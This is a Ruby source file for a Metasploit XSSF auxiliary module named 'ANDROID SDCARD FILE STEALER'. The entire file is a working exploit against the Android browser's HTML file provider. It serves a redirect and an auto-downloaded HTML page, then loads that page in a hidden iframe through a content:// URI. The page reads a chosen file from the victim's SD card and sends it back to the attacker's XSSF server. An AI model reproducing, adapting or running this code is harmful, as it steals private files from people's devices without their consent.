require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'ANDROID SDCARD FILE STEALER',
			'Description' => 'This module permits to steal victim\'s files on SDCARD',
			'Author'      => 	[ 'Thomas Cannon' ]  	# Original discovery, partial disclsoure
		))
		
		register_options(
			[
				OptString.new('FILE_NAME', [true, 'Name on the file to retrieve from /', '/sdcard/download/downloadfile.jpeg'])		# current is /
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		if (req.uri =~ /\.php/)
			filename = nil;		(req.param_string.split('&')).each do |p|;	filename	= $1 			if (p =~ /^filename=(.+)$/); end
				
			code = %Q{ 	<html><body><script>  XSSF_POST_BINARY_AJAX_RESPONSE(XSSF_CREATE_XHR(), "GET", "#{datastore['FILE_NAME']}", "#{self.name}"); </script></body></html> }

			send_response(cli, code, {"Content-Disposition" => "attachment; filename=#{filename}"} )
		else
			random = Rex::Text.rand_text_alphanumeric(rand(10) + 5)
			
			code = %Q{ 	setTimeout(execute_local, 3000);
						window.location.replace(XSSF_SERVER + "#{random}.php?filename=#{random}.html");
						function execute_local() { 
							iframe = XSSF_CREATE_IFRAME("ANDRO_IFRM", 0, 0);	iframe.src = "content://com.android.htmlfileprovider/sdcard/download/#{random}.html";
							document.body.appendChild(iframe);
						}
					}
			send_response(cli, code)
		end
	end
end